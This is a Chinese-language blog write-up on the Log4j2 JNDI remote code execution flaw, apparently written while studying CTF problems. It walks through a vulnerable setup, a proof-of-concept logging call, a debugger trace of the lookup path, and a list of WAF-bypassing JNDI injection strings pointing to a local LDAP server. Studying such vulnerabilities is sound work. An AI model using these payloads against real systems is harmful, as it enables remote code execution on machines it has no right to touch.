---
title: JAVA安全:Log4j2远程代码执行漏洞
---

*作者：Narcher*	*时间：2024/4/25*	*分类：Vulnerability Analysis*

<!--more-->

## 前言

因为在做NSSCTF题库里边的Java题的时候，碰到了一个Fastjson反序列化+Log4j的漏洞。前边学习了Fastjson反序列化漏洞，而Log4j漏洞比较老了，Log4j2漏洞比较新，于是就开始学习一下Log4j2的远程代码执行漏洞。

Apache Log4j2是一个开源的日志记录组件，使用非常的广泛。在工程中以易用方便代替了 System.out 等打印语句，它是JAVA下最流行的日志输入工具。

使用 Log4j2 在一定场景条件下处理恶意数据时，可能会造成注入类代码执行。下面我们来看一下具体流程。



## 正文

### 1.环境搭建

新建maven项目，在pom.xml中加入以下依赖：

```xml
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.14.1</version>
</dependency>
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-api</artifactId>
    <version>2.14.1</version>
</dependency>
<dependency>
    <groupId>junit</groupId>
    <artifactId>junit</artifactId>
    <version>4.12</version>
    <scope>test</scope>
</dependency>
```

至于jdk版本，我用的是8u65，因为Log4j的2.13版本以上对1.8版本之前的不兼容嘛，但要低于8u191，因为之后的版本对于从请求ldap服务并获取Codebase路径之后，在请求Codebase下载Class文件流程中的请求Codebase过程中默认关闭了trustUrlCodebase，所以不会去请求Codebase

然后日志也要输出，我们在src/main/resources目录下添加一个log4j2.xml文件，内容如下：

```xml
<?xml version="1.0" encoding="UTF-8"?>

<configuration status="info">
    <Properties>
        <Property name="pattern1">[%-5p] %d %c - %m%n</Property>
        <Property name="pattern2">
            =========================================%n 日志级别：%p%n 日志时间：%d%n 所属类名：%c%n 所属线程：%t%n 日志信息：%m%n
        </Property>
        <Property name="filePath">logs/myLog.log</Property>
    </Properties>
    <appenders> <Console name="Console" target="SYSTEM_OUT">
        <PatternLayout pattern="${pattern1}"/>
    </Console> <RollingFile name="RollingFile" fileName="${filePath}"
                            filePattern="logs/$${date:yyyy-MM}/app-%d{MM-dd-yyyy}-%i.log.gz">
        <PatternLayout pattern="${pattern2}"/>
        <SizeBasedTriggeringPolicy size="5 MB"/>
    </RollingFile>
    </appenders>
    <loggers>
        <root level="info">
            <appender-ref ref="Console"/>
            <appender-ref ref="RollingFile"/>
        </root>
    </loggers>
</configuration>
```

而其具体的输出则会输出到logs目录下的myLog.log文件中

之后的测试代码我也从这里贴出来：

```java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.util.function.LongFunction;

public class Test2 {
    public static void main(String[] args) {
        Logger logger = LogManager.getLogger(LongFunction.class);
        String username = "${jndi:ldap://127.0.0.1:7777/TestRef}";
        logger.info("User {} login in!", username);
    }
}
```

整个项目差不多长这样，Test.java不用管：

<img src="JAVA%E5%AE%89%E5%85%A8Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1713968846203.png" alt="1713968846203" style="zoom: 50%;" />

### 2.漏洞复现

如果我们正常传入username，输出如下：

<img src="JAVA%E5%AE%89%E5%85%A8Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1713969050181.png" alt="1713969050181" style="zoom:50%;" />

而在其官方文档[Log4j – Log4j 2 Lookups (apache.org)](https://logging.apache.org/log4j/2.x/manual/lookups.html)中提到了这样的一个东西：

<img src="JAVA%E5%AE%89%E5%85%A8Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1713969162132.png" alt="1713969162132" style="zoom:50%;" />

我们把username修改成${java:os}看一下情况：

<img src="JAVA%E5%AE%89%E5%85%A8Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1713969234358.png" alt="1713969234358" style="zoom:50%;" />

输出了os的版本，这个的危害倒也不是很大，真正有危害的是下边的这个：

<img src="JAVA%E5%AE%89%E5%85%A8Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1713969309933.png" alt="1713969309933" style="zoom:67%;" />

支持jndi查询，这样的话，如果目标出网，我们就可以利用Jndi注入远程执行恶意代码，具体流程如下：

在本地恶意类TestRef.class的目录处起一个http服务，之后再叠一个ldap服务，具体代码在Fastjson的复现里贴了，这里就不再搬过来了。服务搭建起来后运行Test2即可远程加载恶意类进行命令执行：

<img src="JAVA%E5%AE%89%E5%85%A8Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1714011476421.png" alt="1714011476421" style="zoom:50%;" />

发现成功弹出计算器，并且貌似命令还执行了两遍，我们下面来调试看看具体流程

### 3.漏洞分析

这里是跟着Drun1baby师傅的思路走的，其实刚开始打了几个断点准备从头开始一点点看， 但等看到PatternLayout这个类之后发现确实重点在这后边，前边都是些赋值之类的操作

从PatternLayout类的toSerializable方法开始打个断点：

<img src="JAVA%E5%AE%89%E5%85%A8Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1714012567406.png" alt="1714012567406" style="zoom:67%;" />

这里的传参中，event包含了我们的传参，此刻buffer还为空，我们继续往下看：

<img src="JAVA%E5%AE%89%E5%85%A8Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1714012809424.png" alt="1714012809424" style="zoom:67%;" />

进入了这个for循环之后就加上调用format方法给buffer赋值，大致流程如下：

先进入format方法：

<img src="JAVA%E5%AE%89%E5%85%A8Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1714013246124.png" alt="1714013246124" style="zoom:67%;" />

然后会根据skipFormattingInfo的情况分别进入不同的情况，这里进入的format方法取决于this的converter的值：

<img src="JAVA%E5%AE%89%E5%85%A8Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1714013604173.png" alt="1714013604173" style="zoom:50%;" />

像上图这种就会进入LiteralPatternConverter类的format方法中

就这样循环了7次后，会进入MessagePatternConverter类的format方法：

<img src="JAVA%E5%AE%89%E5%85%A8Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1714013773693.png" alt="1714013773693" style="zoom:67%;" />

这里有个关键的字符串提取，先判断字符串中是否有${的组合，之后会提取出${}之间的所有字符，我们跟进StrSubstitutor类的replace方法看一看：

<img src="JAVA%E5%AE%89%E5%85%A8Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1714013962769.png" alt="1714013962769" style="zoom:50%;" />

之后会进入StrSubstitutor类的substitute方法（在307行）：

<img src="JAVA%E5%AE%89%E5%85%A8Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1714014043181.png" alt="1714014043181" style="zoom:67%;" />

之后这个substitute方法接着调用311行的substitute方法，这里边经过一系列的判断之后，会提取出${}之间的所有字符的所有字符，并赋值给varName：

<img src="JAVA%E5%AE%89%E5%85%A8Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1714014277699.png" alt="1714014277699" style="zoom:67%;" />

之后会进入resolveVariable方法：

<img src="JAVA%E5%AE%89%E5%85%A8Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1714014321667.png" alt="1714014321667" style="zoom:67%;" />

<img src="JAVA%E5%AE%89%E5%85%A8Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1714014370327.png" alt="1714014370327" style="zoom:67%;" />

这里的resolver通过getVariableResolver获取到了如下的值，可见不止有jndi，我们可以判断出这里提到的值都可以在以后利用：

<img src="JAVA%E5%AE%89%E5%85%A8Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1714014473035.png" alt="1714014473035" style="zoom:67%;" />

可以发现该方法的具体流程中有lookup方法，不确定是不是我们需要的Jndi的lookup方法，跟进看一看：

<img src="JAVA%E5%AE%89%E5%85%A8Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1714014696337.png" alt="1714014696337" style="zoom:67%;" />

可见这里还不是我们想要的Jndi的lookup方法，这里的是Interpolator类的lookup方法，它提取出来了:之前的值，即jndi，并获取JndiLookup类,最终在163行这里调用JndiLookup类的lookup方法：

<img src="JAVA%E5%AE%89%E5%85%A8Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1714015038887.png" alt="1714015038887" style="zoom:67%;" />

之后便是一系列的Jndi注入的流程

至于为什么会触发两次，我调试看了看，大致是因为在加载的时候在命令行打印前会触发一遍，之后写入日志中还会触发一遍(这个我看了网上不少文章，但貌似师傅们都没有提到这一点)

### 4.Bypass

网上很多的WAF都是基于对jndi关键字的过滤，因为在官方文档中有这么一句话：

<img src="JAVA%E5%AE%89%E5%85%A8Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1714016041489.png" alt="1714016041489" style="zoom: 67%;" />

如果USER这个环境变量未设置，就会使用默认值，而这肯定不是我们希望的，下面来看一看如何进行jndi关键字的绕过：

#### 1)多${}绕过：

```xml
${${::-J}ndi:ldap://127.0.0.1:7777/TestRef}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://127.0.0.1/TestRef}
${jndi:${lower:l}${lower:d}a${lower:p}://127.0.0.1/TestRef} #绕过ldap的过滤
```

#### 2)大小写绕过：

因为前边在看resolver的时候看到了lower和upper，我们可以这样：

```xml
${${lower:JN}di:ldap://127.0.0.1:7777/TestRef}
${${upper:jn}DI:ldap://127.0.0.1:7777/TestRef}
```

大小写是无所谓的，因为在Interpolator类的lookup方法中会对截取到的字符全部小写化

#### 3)特殊字符绕过：

```xml
${jnd${upper:ı}:ldap://127.0.0.1:7777/TestRef}
```

#### 4)unicode绕过：

emm，本地的环境反正没过，不知道有没有用，先记下来：

```xml
${sys:\u006fs.name}
```

#### 5)不出现端口号：

注意此时需要ldap服务端口为389

```xml
${jndi:ldap://127.0.0.1/TestRef}
${jndi:ldap://[127.0.0.1]/TestRef}
```



## 小结

先写到这里吧，之后学到什么新的东西再往上添
